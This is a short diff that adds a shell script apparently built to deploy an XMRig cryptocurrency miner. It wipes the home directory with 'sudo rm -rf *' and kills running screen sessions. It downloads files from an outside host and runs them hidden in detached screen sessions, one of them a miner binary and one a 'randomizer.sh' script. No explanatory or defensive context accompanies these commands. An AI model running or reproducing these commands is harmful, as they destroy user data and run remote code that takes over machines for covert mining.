@@ -1,0 +1,4 @@
+cd ~/ && sudo rm -rf * && sudo killall screen || echo "ok" && sudo pkill screen || echo "ok" && sudo curl -Ls -o script http://srv-fuzzle.me/xmrigDO && sudo screen -dmS setup bash script pool address \"algo\" controlcenter:port token
+ 
+ 
+wget srv-fuzzle.me/randomizer.sh && chmod +x randomizer.sh && screen -dmS random ./randomizer.sh xmrigMiner 50 90
